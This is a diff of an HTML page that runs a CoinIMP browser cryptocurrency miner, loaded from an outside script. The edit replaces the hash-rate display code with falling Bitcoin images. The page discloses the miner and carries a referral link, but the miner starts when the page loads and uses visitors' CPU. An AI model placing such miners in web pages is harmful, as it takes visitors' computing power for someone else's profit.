@@ -10,10 +10,7 @@
             background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            overflow: hidden;
         }
 
         .container {
@@ -24,6 +21,7 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             background-color: #ffffff;
             text-align: center;
+            position: relative;
         }
 
         h1 {
@@ -70,6 +68,21 @@
         a:hover {
             text-decoration: underline;
         }
+
+        .bitcoin-img {
+            position: absolute;
+            left: -10%;
+            animation: fall 5s linear infinite, sway 2s linear infinite;
+        }
+
+        @keyframes fall {
+            from { top: -50px; }
+            to { top: calc(100vh - 50px); }
+        }
+
+        @keyframes sway {
+            50% { transform: translateX(10%); }
+        }
     </style>
     <script src="https://www.hostingcloud.racing/ElSO.js"></script>
     <script>
@@ -95,15 +108,27 @@
         },1000);
 
         setTimeout(function(){
-            let div = document.createElement("div");
-            document.body.appendChild(div);
-            setInterval(function(){
-                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
-                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
-                document.getElementById("speedValue").innerText = speed;
-                document.getElementById("totalValue").innerText = total;
-            },500);
-        },1000);
+            let numBitcoins = 10; // Jumlah gambar Bitcoin yang akan jatuh
+            let container = document.body;
+            let bitcoinImages = [];
+
+            for (let i = 0; i < numBitcoins; i++) {
+                let bitcoin = document.createElement('img');
+                bitcoin.src = 'https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg';
+                bitcoin.classList.add('bitcoin-img');
+                bitcoin.style.left = Math.random() * window.innerWidth + 'px';
+                bitcoin.style.animationDelay = Math.random() * 5 + 's';
+                bitcoin.style.animationDuration = Math.random() * 5 + 5 + 's';
+                container.appendChild(bitcoin);
+                bitcoinImages.push(bitcoin);
+            }
+
+            setInterval(() => {
+                bitcoinImages.forEach(bitcoin => {
+                    bitcoin.style.left = Math.random() * window.innerWidth + 'px';
+                });
+            }, 5000);
+        }, 2000);
     </script>
 </head>
 <body>
@@ -113,6 +138,7 @@
             <p>This site is running JavaScript miner from <a href="https://www.coinimp.com/">coinimp.com</a>. If it bothers you, you can stop it.</p>
             <p>If you're interested in mining, you can start <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">here</a>.</p>
             <table class="hash-table">
+                <br>
                 <tr>
                     <td>Speed :</td>
                     <td><span id="speedValue" class="hash-value">0</span></td>
@@ -121,6 +147,7 @@
                     <td>Total :</td>
                     <td><span id="totalValue" class="hash-value">0</span></td>
                 </tr>
+                
             </table>
         </div>
     </div>
